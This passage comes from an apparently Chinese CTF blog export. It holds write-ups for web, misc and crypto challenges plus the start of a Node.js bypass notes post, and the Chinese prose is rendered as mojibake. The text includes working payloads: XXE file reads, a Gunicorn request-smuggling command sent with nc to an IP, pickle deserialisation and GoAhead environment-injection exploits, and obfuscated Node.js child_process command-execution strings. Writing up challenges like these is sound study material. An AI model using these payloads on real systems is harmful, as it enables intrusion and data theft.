socket.getaddrinfo(hostname,&#x27;http&#x27;)[0][4][0] if is_inner_ipaddress(ip_address): return False,&quot;inner ip address attack&quot; else: return False, &quot;You not get the right clue!&quot; except BaseException as e: return False, str(e) except: return False, &quot;unknow error&quot;def ip2long(ip_addr): return struct.unpack(&quot;!L&quot;, socket.inet_aton(ip_addr))[0]def is_inner_ipaddress(ip): ip = ip2long(ip) print(ip) return ip2long(&#x27;127.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long(&#x27;10.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long(&#x27;172.16.0.0&#x27;) &gt;&gt; 20 == ip &gt;&gt; 20 or ip2long(&#x27;192.168.0.0&#x27;) &gt;&gt; 16 == ip &gt;&gt; 16 or ip2long(&#x27;0.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24def waf1(ip): forbidden_list = [ &#x27;.&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;7&#x27;] for word in forbidden_list: if ip and word: if word in ip.lower(): return True return Falsedef judge_ip(ip): if(waf1(ip)): return Fasle else: addr = addr.encode(encoding = &quot;utf-8&quot;) ipp = base64.encodestring(addr) ipp = ipp.strip().lower().decode() if(ip==ipp): global control_key control_key = 1 return True else: return False åŸæ¥æ˜¯è¿™é‡Œçš„ipå­˜åœ¨è¿‡æ»¤ï¼Œjudge_ip()å¯¹è·å–çš„ipè¿›è¡Œäº†base64åŠ å¯†ï¼Œå¹¶ä¸”urlä¸­ä¸èƒ½å«æœ‰ç‚¹ä¸”å…·æœ‰æ ¼å¼ï¼Œå› æ­¤æˆ‘ä»¬ä¼ å‚ï¼š 1?url=http://@MTI3LjAuMC4x è·å¾—ä¸¤ä¸ªå‚æ•°ï¼š 1/mti3ljaumc4x å’Œ a_cookie = aW4gZmFjdCBjb29raWUgaXMgdXNlZnVsIQ== è®¿é—®å¯¹åº”ç½‘å€ï¼Œé˜…è¯»ä»£ç å‘ç°å­˜åœ¨xxeæ”»å‡»ï¼Œé‚£å°±æ„é€ POSTåŒ…ç›´æ¥æ‰“ï¼Œè¿™é‡Œçš„ç”¨æˆ·å¯†ç éœ€è¦çŒœä¸€ä¸‹ï¼š 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:///app/flag.txt&quot;&gt; ]&gt; &lt;user&gt; &lt;name&gt; &amp;admin; &lt;/name&gt; &lt;password&gt; 123456 &lt;/password&gt;&lt;/user&gt; å‘åŒ…è·å–flagã€‚ è®©æˆ‘åº·åº·ï¼ï¼gunicornçš„èµ°ç§æ¼æ´ï¼Œä¹‹å‰ä¹Ÿæ˜¯ç‰¹æ„å­¦äº†ä¸‹httpèµ°ç§ï¼Œè¿™é¢˜çš„æ¼æ´å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šGunicorn 20.0.4 Request Smuggling payloadï¼š 1echo -en &quot;GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 90\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nsecr3t_ip:127.0.0.1\\r\\nContent-Length: 55\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n&quot; | nc 59.110.159.206 7020 MelodyæŸ¥çœ‹æºç å‘ç°/infoï¼Œè®¿é—®åå‘ç°åªèƒ½ç”¨Melodyæµè§ˆå™¨ç™»å½•ï¼Œé‚£å°±æ›´æ”¹UAå¤´ï¼ŒæŸ¥çœ‹æ¡†æ¶å‘ç°ä¸ºflaskï¼ŒçŒœæµ‹å­˜åœ¨sstiã€‚ åˆ©ç”¨ç½‘ç«™ç»™çš„æç¤ºå‚æ•°å‘ç°åˆ©ç”¨è¿™ä¸ªå‚æ•°å¯ä»¥è¿›è¡Œsstiï¼Œæµ‹è¯•ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œåœ¨?Melody=&#123;&#123;config&#125;&#125;æ—¶å‘ç°äº†ä¸€ä¸ªkeyï¼š 1&#x27;SECRET_KEY&#x27;: &#x27;meldoy-is-so-cute-wawawa!&#x27; é‚£ä¸å‡ºæ„å¤–æ˜¯ä¸€ä¸ªflask-sessionä¼ªé€ ç™»å½•ï¼Œåˆ©ç”¨å·¥å…·æ„é€ å‡ºsessionä»¥adminçš„èº«ä»½ç™»å½•ï¼Œç™»é™†åå®¡æŸ¥å…ƒç´ å‘ç°å¯ç–‘æ–‡ä»¶/static/real_flag_part.pyï¼ŒæŸ¥çœ‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*- coding:utf-8 -*- import pickle import melody import base64 from flask import Flask, Response,request class register: def __init__(self,name,password): self.name = name self.password = password def __eq__(self, other): return type(other) is register and self.name == other.name and self.password == other.password class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module[0:8] == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;],name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name)) def find(s): return RestrictedUnpickler(io.BytesIO(s)).load() @app.route(&#x27;/therealflag&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) def realflag(): if request.method == &#x27;POST&#x27;: try: data = request.form.get(&#x27;melody&#x27;) if b&#x27;R&#x27; in base64.b64decode(data): return &#x27;no reduce&#x27; else: result = find(base64.b64decode(data)) if type(result) is not register: return &#x27;The type is not correct!&#x27; correct = ((result == register(melody.name,melody.password))&amp;(result == register(&quot;melody&quot;,&quot;hug&quot;))) if correct: if session[&#x27;username&#x27;] == &#x27;admin&#x27;: return Response(read(&#x27;./flag.txt&#x27;)) else: return Response(&quot;You&#x27;re not admin!&quot;) except Exception as e: return Response(str(e)) test = register(&#x27;admin&#x27;, &#x27;123456&#x27;) data = base64.b64encode(pickle.dumps(test)).decode() return Response(data) åˆè§åˆ°pickleååºåˆ—åŒ–äº†ï¼Œå¥½åƒä¹‹å‰æœ‰è¯´è¿‡è¦å†™è¿™ä¸ªçš„åšå®¢ä½†æ˜¯åˆ°ç°åœ¨è¿˜æ²¡å†™ï¼ˆï¼Œä¸è¿‡è¿™ä¸ªååºåˆ—åŒ–ä¸€èˆ¬éš¾åº¦éƒ½ä¸æ˜¯å¾ˆé«˜ï¼Œexpï¼š 1234567891011121314import pickle import base64 class register: def __init__(self,name,password): self.name = name self.password = password def __eq__(self, other): return type(other) is register and self.name == other.name and self.password == other.password flag = register(&quot;melody&quot;,&quot;hug&quot;) a = pickle.dumps(flag) print(base64.b64encode(a)) æŠŠå¾—åˆ°çš„ç»“æœä»¥melodyå‚æ•°ä¼ å‚ç»™/therealflagå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚ ping2rceè¿›å…¥ç½‘é¡µå°±æ˜¯ä¸ªè¾“å…¥æ¡†å’Œä¸€ä¸ªpingæŒ‰é’®ã€‚é¢˜ç›®æŠŠè¿‡æ»¤åšçš„å¾ˆä¸¥æ ¼ï¼Œä¸å¯èƒ½é€šè¿‡å¸¸è§„æ‰‹æ®µè¿›è¡Œrceã€‚ å®¡æŸ¥å…ƒç´ ä¸­æŸ¥çœ‹ä¿¡æ¯ï¼Œå‘ç°é¢˜ç›®æ¡†æ¶æ˜¯goaheadï¼Œæƒ³åˆ°pç‰›ä»Šå¹´1æœˆçš„ä¸€ç¯‡æ–‡ç« ï¼šGoAheadç¯å¢ƒå˜é‡æ³¨å…¥å¤ç°è¸©å‘è®°è¿™ç¯‡æ–‡ç« è¯¦ç»†è®²è¿°äº†å¦‚ä½•åˆ©ç”¨goaheadæ¥è¿›è¡Œç¯å¢ƒå˜é‡æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬è¦å¦‚ä½•è¿›è¡Œæ³¨å…¥å‘¢ï¼Œè¿™åˆä¸å¾—ä¸æåˆ°pç‰›ä»Šå¹´2æœˆçš„ä¸€ç¯‡æ–‡ç« ï¼šæˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤ åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¿™ä¸æ˜¯å¾ˆå¥½çš„å¥‘åˆäº†é¢˜ç›®çš„è¦æ±‚å—ï¼Œé‚£ä¹ˆç»“åˆè¿™ä¸¤ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬æ„é€ è¯·æ±‚åŒ…ï¼š 12345678Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPMContent-Length: 164------WebKitFormBoundarylNDKbe0ngCGdEiPMContent-Disposition: form-data; name=&quot;BASH_FUNC_ping%%&quot;() &#123; cat /flag; &#125;------WebKitFormBoundarylNDKbe0ngCGdEiPM-- å‘åŒ…åå³å¯è·å¾—flagã€‚ MISCå†¬å¥¥ä¼šè¿™é¢˜çœ‹æè¿°å°±å¯ä»¥çŒœå‡ºæ¥å‹ç¼©åŒ…å¯†ç å°±æ˜¯äº†ã€‚é¦–å…ˆç»™äº†ä¸€å¼ å›¾ï¼Œ010æ”¹é«˜å‘ç°ä¸€ä¸²unicodeï¼Œè½¬ç åé—®æˆ‘ä»¬å†°å¢©å¢©çš„å°ä¼™ä¼´çš„åŸå‹ï¼Œé‚£å°±æ˜¯ç¯ç¬¼ã€‚å› æ­¤è¿™é¢˜å‹ç¼©åŒ…å¯†ç å°±æ˜¯ç¯ç¬¼ï¼Œè§£å‹åå›¾ç‰‡ç”¨notepadæ‰“å¼€å°±æ˜¯flagã€‚ å•æ¿å°å°†è‹ç¿Šé¸£åŒæ ·ä¹Ÿæ˜¯010æ”¹å›¾ç‰‡é«˜åº¦ï¼Œæœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«æåæ˜¯unicodeï¼Œè½¬ç åé—®æˆ‘ä»¬ä¸­å›½é˜Ÿåœ¨å†¬å¥¥è·å¾—äº†å‡ æšå¥–ç‰Œï¼Œå‡ é‡‘å‡ é“¶å‡ é“œï¼Œé‚£ä¹ˆç­”æ¡ˆ15942å°±æ˜¯å‹ç¼©åŒ…å¯†ç ï¼Œè§£å‹å¾—åˆ°flagã€‚ é™ç»´æ‰“å‡»æ‰“å¼€å›¾ç‰‡ä¸€ä¸ªå±‘é­”å¥³ï¼Œforemoståˆ†ç¦»å‡ºä¸€å¼ å›¾ï¼Œæ ¹æ®é¢˜ç›®æ„æ€è¿™é‡Œåº”è¯¥å¯¹é‚£å¼ å›¾ç‰‡è¿›è¡Œé™ç»´ï¼Œä¸è¿‡æˆ‘ä»¬ç”¨å¼ºå¤§çš„zstegå¯ä»¥æå–ã€‚ æå–ä¹‹åæ˜¯ä¸€ä¸²çœ‹éƒ½çœ‹ä¸æ‡‚çš„æ–‡å­—ï¼Œé‚£ä¹ˆç»“åˆå±‘é­”å¥³ï¼Œè¿™é‡Œçš„æ–‡å­—æ­£æ˜¯å‡ºè‡ªé­”å¥³ä¹‹æ—…ï¼Œbç«™å¤§å“¥å·²ç»åˆ†æå‡ºäº†å¯¹åº”çš„æ–‡å­—ï¼Œç›´æ¥å‚è€ƒå°±å¯ä»¥äº†ï¼šã€Šé­”å¥³ä¹‹æ—…ã€‹æ–‡å­—ç ´è§£Â·å°åˆ·ä½“ ç¿»è¯‘å‡ºæ¥çš„ç©æ„å°±æ˜¯flagã€‚ çœŸç›¸åªæœ‰ä¸€ä¸ªä¸‹è½½ä¸‹æ¥ä¸‰ä¸ªæ–‡ä»¶ï¼Œé¦–å…ˆå°†streamçš„è¯·æ±‚å¤´ä¿®å¤ï¼Œæ”¹åç¼€ä¸ºzipï¼Œè§£å‹åè·å–ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯æ‰“å¼€è¿™ä¸ªå‹ç¼©åŒ…éœ€è¦ä¸€ä¸ªå¯†ç ã€‚ æ¥ä¸‹æ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒLSBå‘ç°ä¿¡æ¯passwd 1998/xx/xxï¼Œæ©ç çˆ†ç ´å‹ç¼©åŒ…å‡ºæ¥å¯†ç æ˜¯19981111ï¼Œè§£å‹åå¾—åˆ°ä¸€ä¸ªæµé‡åŒ…ã€‚æ‰“å¼€æµé‡åŒ…æå–TFTPå¯¹è±¡ï¼Œå‘ç°password.mp3ï¼ŒæŸ¥çœ‹æ³¢å½¢å›¾å‘ç°æ‘©æ–¯å¯†ç ï¼Œè§£ç ä¸ºisccmiscã€‚ æœ€ååˆ©ç”¨è¿™ä¸ªå¯†ç è¿›è¡Œsnowéšå†™çš„æå–ï¼Œè·å–flagã€‚ è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—-1è¿™é¢˜æ‹¿äº†ä¸ªä¸€è¡€ï¼Œå¥½é¢˜ï¼ç»™äº†ä¸ªtxtæ–‡ä»¶ã€psdæ–‡ä»¶å’Œå‹ç¼©åŒ…ï¼Œå‘ç°txtä¸­æ˜¯5è¡Œç”±æ˜Ÿæ˜Ÿç»„æˆçš„è¯—ï¼Œè€Œpsdä¸­æœ‰ä¸¤å¼ å›¾ï¼Œå°†ä¸€å¼ å›¾çš„ä¸é€æ˜åº¦æ”¹ä¸º100åå‘ç°ä¸€ä¸ªæœ‰å‘å›¾ï¼Œæ ¹æ®å›¾çš„åºå·å¯¹åº”çš„æ˜Ÿæ˜Ÿè¯—çš„è¡Œæ•°å³ä¸ºå‹ç¼©åŒ…å¯†ç ã€‚ ç”¨winrarè§£å‹åå¾—åˆ°å¯†ç æœ¬ï¼Œæ¯ç§æ˜Ÿæ˜Ÿå’Œä¸€ä¸ªå­—æ¯æˆ–ç¬¦å·ç›¸å¯¹åº”ï¼Œç¿»è¯‘å®Œæ•´é¦–è¯—å‡ºæ¥çš„å°±æ˜¯flagã€‚ è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—-2åªæœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢çš„å†…å®¹ä¹Ÿæ˜¯æ˜Ÿæ˜Ÿï¼Œä½†æ˜¯çœ‹æ˜Ÿæ˜Ÿçš„æ ¼å¼ï¼š 1\\ğŸŒŸğŸŒ ğŸŒ âœ´ğŸŸ‰\\ğŸŒŸğŸŒ ğŸŒ â˜…â£ ä¸€ä¸‹å°±è®©äººæƒ³åˆ°unicodeç¼–ç ï¼Œè€Œå¯¹åº”å¯†ç æœ¬åå‘ç°å¦‚æœå°†æ˜Ÿæ˜Ÿå¯¹åº”çš„unicodeç¼–ç çš„æœ€åä¸€ä½å¯¹åº”æ›¿æ¢ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸²æ­£ç¡®çš„unicodeç¼–ç ï¼Œè§£ç å°±å¯ä»¥å¾—åˆ°flagã€‚ éšç§˜çš„ä¿¡æ¯æè¿°ä¸­çš„base64ç¼–ç å°±æ˜¯å‹ç¼©åŒ…å¯†ç ï¼Œè§£å‹åæ˜¯ä¸€å¼ å›¾ï¼Œç”¨stegsloveæå–LSBï¼Œé€šé“RGB000ï¼Œå‘ç°å‰ä¸‰è¡Œå­˜åœ¨å¯ç–‘ä¿¡æ¯ï¼Œå°†å…¶16è¿›åˆ¶å€¼è½¬åŒ–ä¸º2è¿›åˆ¶ï¼Œåˆ é™¤å¤´éƒ¨ç¬¬ä¸€ä¸ª0ä¹‹å‰çš„æ‰€æœ‰1ï¼Œå†è½¬æˆasciiç å³å¯å¾—åˆ°flagã€‚ å¥—ä¸­å¥—ç»™äº†ä¸€å¼ å›¾å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…æ˜¯åŠ å¯†çš„ã€‚ä¿®å¤å›¾ç‰‡æ–‡ä»¶å¤´ï¼Œå‘ç°pngçš„crc32é”™è¯¯ï¼Œæ”¹é«˜å‘ç°flag1ã€‚ä½†æ˜¯è¿™ä¸ªflag1æ˜æ˜¾ä¸å®Œæ•´ï¼Œæˆ‘ä»¬å°†å›¾ç‰‡æˆªå›¾æ‰”è¿›stegsloveï¼Œåœ¨Blue0é€šé“å‘ç°å‰©ä¸‹çš„éšè—å­—ç¬¦ã€‚ æ¥ä¸‹æ¥åœ¨å›¾ç‰‡çš„hexæœ€åå‘ç°ä¸€ä¸²base64ï¼Œè§£ç åå¾—åˆ°flag2ï¼Œå°†ä¸¤ä¸ªflagç»„åˆèµ·æ¥å°±æ˜¯å‹ç¼©åŒ…çš„å¯†ç ï¼š 1wELC0m3_T0_tH3_ISCC_Zo2z å‹ç¼©åŒ…é‡Œé¢æ˜¯ä¸€ä¸ªå¯†ç é¢˜ï¼Œç™¾åº¦å‘ç°æ˜¯ctfwiki2014åŸé¢˜ï¼Œexpï¼š 123456789101112131415161718192021222324252627pubKey = nbit = len(pubKey)encoded = A = Matrix(ZZ, nbit + 1, nbit + 1)for i in range(nbit): A[i, i] = 1for i in range(nbit): A[i, nbit] = pubKey[i]A[nbit, nbit] = -(encoded)res = A.LLL()for i in range(0, nbit + 1): M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag == True: M = &#x27;&#x27;.join(str(j) for j in M) M = M[:-1] M = hex(int(M, 2))[2:] print(hex(int(M,16))) è·‘sageè·å¾—flagã€‚ å°å…‰å­¦AIæ„Ÿè°¢äººå·¥æ™ºèƒ½Strlé€šè¿‡è„‘ä¸­è®­ç»ƒæ¨¡å‹ï¼Œç„¶åå¾—å‡ºå¤§è‡´åŒºé—´ï¼Œæœ€åéå†å¯èƒ½æ•°æ®è§£å†³äº†è¿™ä¸€ç»´æŠ¤å0è§£çš„ä¸–ç•Œéš¾é¢˜ï¼Œexpï¼š 1234567891011121314listt=[]for i in range(1,10): for j in range(1,10): listt.append(i/j)with open(&#x27;./dataplus.txt&#x27;, &#x27;w&#x27;) as f: # è®¾ç½®æ–‡ä»¶å¯¹è±¡ for a1 in range(20000,40000): for a2 in listt: for a3 in listt: print(&quot;%dï¼š%dï¼š%d&quot;%(a1,a1*a2,a1*a3),file = f) è·‘å‡ºå­—å…¸åçˆ†ç ´å‹ç¼©åŒ…å³å¯ï¼Œåè¿™ä¸ªéé¢„æœŸè§£å·²è¢«ä¿®å¤ã€‚ è§¦ä¸å¯åŠçœŸçš„è§¦ä¸å¯åŠäº†ï¼Œç»æ€ï¼Œæ— è§£ã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"nodejså¸¸è§çŸ¥è¯†ç‚¹æ€»ç»“","slug":"nodejså¸¸è§çŸ¥è¯†ç‚¹æ€»ç»“","date":"2022-05-11T08:23:17.000Z","updated":"2022-05-12T12:09:09.813Z","comments":true,"path":"2022/05/11/nodejså¸¸è§çŸ¥è¯†ç‚¹æ€»ç»“/","link":"","permalink":"http://example.com/2022/05/11/nodejs%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","excerpt":"å‰è¨€ ä¸çŸ¥é“è¿™ä¸ªå‘æœ‰æ²¡æœ‰æŒ–ï¼Œä¸è¿‡è¿™å—å¯ä»¥è¯´æ˜¯çŸ¥è¯†ç›²åŒºäº†ï¼Œç®€å•å®‰æ’ä¸€ä¸‹nodejsè¿™å—çš„çŸ¥è¯†å§ã€‚","text":"å‰è¨€ ä¸çŸ¥é“è¿™ä¸ªå‘æœ‰æ²¡æœ‰æŒ–ï¼Œä¸è¿‡è¿™å—å¯ä»¥è¯´æ˜¯çŸ¥è¯†ç›²åŒºäº†ï¼Œç®€å•å®‰æ’ä¸€ä¸‹nodejsè¿™å—çš„çŸ¥è¯†å§ã€‚ bypassè§£é¢˜æ—¶é‡åˆ°å„ç§å„æ ·çš„è¿‡æ»¤æ€»æ˜¯ä»¤äººå¤´ç–¼ï¼Œä¸ºäº†æˆåŠŸbypassï¼Œæˆ‘ä»¬éœ€è¦æŒæ¡ä¸€å®šçš„å§¿åŠ¿ã€‚ hexæœ€ç»å…¸çš„å­—ç¬¦ä¸²ä¸åå…­è¿›åˆ¶ç­‰ä»·ï¼š 12console.log(&quot;a&quot;===&quot;\\x61&quot;);// true unicodejsä¸­å¾ˆå¸¸è§çš„ä¸€ç§ç¼–ç æ–¹å¼ï¼Œå’Œåå…­è¿›åˆ¶æ˜¯ç±»ä¼¼çš„ï¼š 12console.log(&quot;\\u0061&quot;===&quot;a&quot;);// true åŠ å·æ‹¼æ¥sstiä¸­å¸¸ç”¨çš„åŠ å·æ‹¼æ¥æ”¾åœ¨jsä¸­ä¹Ÿæ˜¯å¯ä»¥å®ç°çš„ï¼š 12console.log(&quot;a&quot;+&quot;bc&quot;===&quot;abc&quot;);// true base64å¾ˆç»å…¸çš„æ€è·¯ï¼Œå„è·¯è¯­è¨€çš„ç»•è¿‡éƒ½å¿…é¡»æœ‰base64ï¼š 12eval(Buffer.from(&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;,&#x27;base64&#x27;).toString())//global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;) æ¨¡æ¿å­—ç¬¦ä¸²å’Œcè¯­è¨€ä¸­çš„å®å®šä¹‰æ¯”è¾ƒç±»ä¼¼ï¼Œå¯ä»¥ç›´æ¥åµŒå…¥å¼è¡¨è¾¾å­—ç¬¦ä¸²å­—é¢é‡ï¼š 1require(&#x27;child_process&#x27;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;curl 127.0.0.1:1234&#x27;) concatè¿æ¥è¿™ä¸ªä¹Ÿå’Œsstiå¸¸ç”¨çš„ä¸€æ ·ï¼Œç”¨concatå‡½æ•°ç›´æ¥æ‹¼æ¥ï¼š 1require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;) JSå¤§å°å†™è¿™æ˜¯ä¸ªè€è€ƒç‚¹äº†ï¼Œå°±æ˜¯åˆ©ç”¨åœ¨toUpperCase()ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSï¼Œè€Œåœ¨toLowerCase()ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚ å…¶å®jsä¸­è¿˜æœ‰ä¸¤ä¸ªå‡½æ•°æ–¹æ³•ï¼ŒtoLocaleUpperCase()å’ŒtoLocaleLowerCase()ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ä¹Ÿæ˜¯å°†å­—ç¬¦ä¸²å˜ä¸ºå¤§å†™æˆ–å°å†™ã€‚è¿™ä¸¤ä¸ªå‡½æ•°ä¸å‰é¢ä¸¤ä¸ªå‡½æ•°çš„åŒºåˆ«åœ¨äºï¼Œåä¸¤ä¸ªå‡½æ•°åœ¨å°†å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„å­—æ¯å­—ç¬¦éƒ½å°†è¢«è½¬æ¢ä¸ºå¤§ï¼ˆå°ï¼‰å†™çš„åŒæ—¶ï¼Œä¼šé€‚åº”å®¿ä¸»ç¯å¢ƒçš„å½“å‰åŒºåŸŸè®¾ç½®ã€‚å› æ­¤å¦‚æœè¯­è¨€è§„åˆ™ä¸å¸¸è§„çš„ Unicode å¤§å°å†™æ˜ å°„æ–¹å¼å†²çªï¼Œé‚£ä¹ˆç»“æœå°±ä¼šä¸åŒã€‚ ä¸è¿‡è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œè¿˜æ˜¯éœ€è¦å‰ä¸¤ä¸ªå‡½æ•°ã€‚ å‘½ä»¤æ‰§è¡Œjsçš„eval()åŒæ ·ä¹Ÿå¯ä»¥æ‰§è¡Œjsè¯­å¥ã€‚è€ŒNode.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæˆ‘ä»¬æ„é€ è¿™æ ·å¦‚ä¸‹çš„payloadï¼š 123require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;./&#x27;]).stdout.toString()global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).toString() å¦‚æœexecæˆ–è€…loadè¿™ç±»å…³é”®è¯è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬é™¤äº†ç”¨ä¸Šé¢ç¬¬äºŒä¸ªpayloadä»¥åŠbypassä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•ç»•è¿‡ï¼š fsæ¨¡å—åˆ©ç”¨fsæ¨¡å—åŒæ ·ä¹Ÿå¯ä»¥åšåˆ°è¯»å–å½“å‰ç›®å½•çš„æ–‡ä»¶åï¼Œå¹¶ä¸”å¯ä»¥è¯»å–æ–‡ä»¶ï¼š 12require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)require(&#x27;fs&#x27;).readFileSync(&#x27;flag.txt&#x27;,&#x27;utf-8&#x27;) æ–‡ä»¶è¯»å–å¦‚æœåªæ˜¯åšä¸€äº›ç®€å•çš„æ–‡ä»¶è¯»å–çš„è¯ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªå˜é‡å³å¯ï¼š 12__filename è¡¨ç¤ºå½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬çš„æ–‡ä»¶åã€‚å®ƒå°†è¾“å‡ºæ–‡ä»¶æ‰€åœ¨ä½ç½®çš„ç»å¯¹è·¯å¾„ï¼Œä¸”å’Œå‘½ä»¤è¡Œå‚æ•°æ‰€æŒ‡å®šçš„æ–‡ä»¶åä¸ä¸€å®šç›¸åŒã€‚å¦‚æœåœ¨æ¨¡å—ä¸­ï¼Œè¿”å›çš„å€¼æ˜¯æ¨¡å—æ–‡ä»¶çš„è·¯å¾„ã€‚__dirname è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬æ‰€åœ¨çš„ç›®å½•ã€‚ æ•°ç»„åˆ©ç”¨jsä¸­å¯¹äºæ•°ç»„çš„åˆ©ç”¨ä¹Ÿæ˜¯æ¯”è¾ƒå¤šçš„ï¼Œæ¯•ç«Ÿåˆèƒ½æŠ¥é”™åˆèƒ½ç»•è¿‡çš„ä¸œè¥¿éƒ½æ˜¯æˆ‘ä»¬æœ€å–œæ¬¢çš„ã€‚ æŠ¥é”™åˆ©ç”¨ï¼š 1234567891011121314function LoginController(req, res) &#123; if (req.body.username === &quot;admin&quot; &amp;&amp; req.body.password.length === 16) &#123; try &#123; req.body.password = req.body.password.toUpperCase() if (req.body.password !== &#x27;54gkj7n8uo55vbo2&#x27;) &#123; return res.status(403).json(&#123;msg: &#x27;invalid username or password&#x27;&#125;) &#125; &#125; catch (__) &#123;&#125; req.session[&#x27;unique_id&#x27;] = randString.generate(16) res.json(&#123;msg: &#x27;ok&#x27;&#125;) &#125; else &#123; res.status(403).json(&#123;msg: &#x27;login failed&#x27;&#125;) &#125;&#125; è¿™æ˜¯hgame2022ç¬¬å››å‘¨çš„ä¸€é“webé¢˜ï¼Œå…¶ä¸­ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯åœ¨è¿™ä¸ªç™»é™†ä¸Šã€‚é˜…è¯»ä»£ç è¦æ±‚æˆ‘ä»¬è¾“å…¥å¯†ç ç»è¿‡å¤§å†™è½¬æ¢åç­‰äºä¸€ä¸²å°å†™å¯†ç ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ã€‚ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œçš„å¼‚å¸¸æŠ¥é”™å¤„ç†æœºåˆ¶çš„catchéƒ¨åˆ†æ˜¯æ²¡æœ‰è¿”å›å€¼çš„ï¼Œè¿™å°±ä¼šå¸¦æ¥æ¼æ´ï¼Œå’Œä¹Ÿæ˜¯å®æˆ˜ä¸­ç»å¸¸ä¼šå­˜åœ¨çš„é—®é¢˜ã€‚ å®˜æ–¹wpç»™å‡ºçš„payloadï¼š 1&#123;&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;:&#123;&quot;length&quot;: 16&#125;&#125; è¿™é‡Œä¹Ÿå¯ä»¥åˆ©ç”¨æ•°ç»„æ¥æäº‹æƒ…ï¼Œæˆ‘å½“æ—¶çš„è§£æ³•ï¼š 1&#123;&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;:[&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;]&#125; ç»•è¿‡åˆ©ç”¨ï¼š 12345678910111213141516171819202122232425var express = require(&#x27;express&#x27;);var 